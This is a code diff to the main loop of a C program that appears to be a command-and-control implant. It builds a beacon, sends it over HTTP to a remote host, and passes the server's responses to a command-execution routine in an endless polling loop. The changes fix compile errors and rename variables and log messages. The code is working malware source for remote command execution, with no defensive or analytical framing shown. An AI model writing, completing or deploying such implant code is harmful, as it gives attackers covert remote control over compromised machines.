@@ -154,14 +154,14 @@ int main(int argc, char *argv[])
 	printf(GREEN("done:\n") "%s", beacon);
 
 	printf("[*] Building HTTP request...");
-	char *http_req = malloc(HTTP_REQ_MAX_SIZE) {
-	if (http_request == NULL) {
+	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
+	if (http_req == NULL) {
 		printf(RED("failed\n"));
 		return -1;
 	}
 	sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
-			"Host: " RHOST ":" RPORT_STR "\r\n"
-			"Content-Length: %d\r\n\r\n%s", strlen(data), data);
+		"Host: " RHOST ":" RPORT_STR "\r\n"
+		"Content-Length: %d\r\n\r\n%s", strlen(beacon), beacon);
 	printf(GREEN("done\n"));
 
 	while (1) {
@@ -178,7 +178,7 @@ int main(int argc, char *argv[])
 		/* We have a working socket */
 		sockfd = ret;
 
-		ret = send_beacon(sockfd, http_request, strlen(http_request));
+		ret = send_beacon(sockfd, http_req, strlen(http_req));
 		if (ret == ABORT) {
 			close(sockfd);
 			break;
@@ -194,9 +194,9 @@ int main(int argc, char *argv[])
 			char *response = get_beacon_resp(sockfd);
 			if (response) {
 				printf("[*] Server response:\n%s\n", response);
-				printf(BLUE("[*] Moving to execution subsystem\n"));
-				exec_commands(response);
-				printf(BLUE("[*] Exiting executing subsystem\n"));
+				printf(BLUE("[*] Preparing execution...\n"));
+				parse_and_exec(response);
+				printf(BLUE("[*] Resuming main loop\n"));
 				free(response);
 				sleep(timeout);
 			}
@@ -204,7 +204,7 @@ int main(int argc, char *argv[])
 	}
 
 	free(beacon);
-	free(http_request);
+	free(http_req);
 
 	return 0;
 }
